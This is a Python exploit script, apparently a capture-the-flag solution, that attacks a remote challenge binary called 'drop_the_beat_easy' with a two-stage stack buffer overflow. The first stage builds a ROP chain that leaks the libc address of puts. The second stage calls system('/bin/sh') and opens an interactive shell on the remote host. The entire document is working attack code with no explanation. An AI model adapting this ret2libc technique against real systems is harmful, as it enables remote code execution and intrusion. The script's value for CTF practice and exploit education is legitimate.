from ptrlib import *

libc = ELF("./libc.so.6")
elf = ELF("./drop_the_beat_easy")
#sock = Process("./drop_the_beat_easy")
sock = Socket("prob.vulnerable.kr", 20002)
rop_pop1 = 0x080483b9

# stage 1
payload = b'A' * 0x68
payload += p32(elf.plt("puts"))
payload += p32(rop_pop1)
payload += p32(elf.got("puts"))
payload += p32(elf.symbol("main"))
sock.sendlineafter("..!\n", "1")
sock.recvline()
sock.send(payload)
sock.recvline()
sock.recvline()
libc_base = u64(sock.recvline()[:4]) - libc.symbol("puts")
logger.info("libc base = " + hex(libc_base))

# stage 2
payload = b'A' * 0x68
payload += p32(libc_base + libc.symbol("system"))
payload += p32(0xdeadbeef)
payload += p32(libc_base + next(libc.find("/bin/sh\0")))
sock.sendlineafter("..!\n", "1")
sock.recvline()
sock.send(payload)

sock.interactive()
